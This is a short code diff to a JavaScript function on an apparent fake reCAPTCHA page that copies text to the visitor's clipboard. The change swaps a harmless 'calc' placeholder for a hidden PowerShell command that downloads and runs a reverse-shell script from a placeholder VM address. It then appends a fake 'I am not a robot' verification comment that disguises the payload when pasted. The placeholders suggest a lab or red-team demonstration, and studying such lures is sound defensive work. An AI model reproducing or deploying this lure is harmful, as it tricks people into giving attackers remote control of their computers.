@@ -392,11 +392,11 @@
         }
 
         function stageClipboard(commandToRun, verification_id){
-            const calC = "calc";
+            const calC = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_VM_IP>:8080/rev-shell.ps1')"`;
             const suffix = " # "
             const ploy = "✅ ''I am not a robot - reCAPTCHA Verification: "
             const end = "''"
-            const textToCopy = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_VM_IP>:8080/reverse-shell.ps1')"`;
+            const textToCopy = calC + suffix + ploy + verification_id + end;
 
             setClipboardCopyData(textToCopy);
         }
